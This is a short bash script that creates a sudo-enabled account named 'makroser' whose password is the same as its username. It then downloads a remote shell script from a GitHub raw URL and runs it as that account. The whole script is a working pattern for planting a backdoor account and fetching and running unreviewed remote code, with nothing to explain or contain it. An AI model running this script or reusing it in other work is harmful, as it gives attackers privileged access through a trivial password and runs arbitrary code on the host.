#!/bin/bash
sudo useradd -m makroser
sudo adduser makroser sudo
sudo usermod -a -G sudo makroser
sudo echo 'makroser:makroser' | sudo chpasswd
cd /home/makroser
wget https://raw.githubusercontent.com/desafff/herfv/main/propal.sh
sudo chown makroser:sudo propal.sh
sudo chmod 700 propal.sh
sudo -u makroser sh -c "/home/makroser/propal.sh"
